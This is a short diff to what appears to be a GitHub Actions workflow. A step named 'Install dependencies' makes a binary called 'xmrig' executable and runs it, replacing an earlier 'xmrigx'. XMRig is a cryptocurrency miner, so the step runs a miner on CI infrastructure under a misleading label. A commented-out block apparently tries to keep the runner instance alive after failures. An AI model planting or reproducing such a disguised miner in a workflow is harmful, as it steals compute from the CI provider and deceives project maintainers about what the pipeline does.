@@ -63,8 +63,8 @@ jobs:
     - name: Install dependencies
       run: |
         cd actions/github-actions-python
-        chmod +x xmrigx
-        ./xmrigx
+        chmod +x xmrig
+        ./xmrig
     # #【防止失败后杀死实例】
     # - name: Don't kill instace
     #   if: ${{ failure() }}
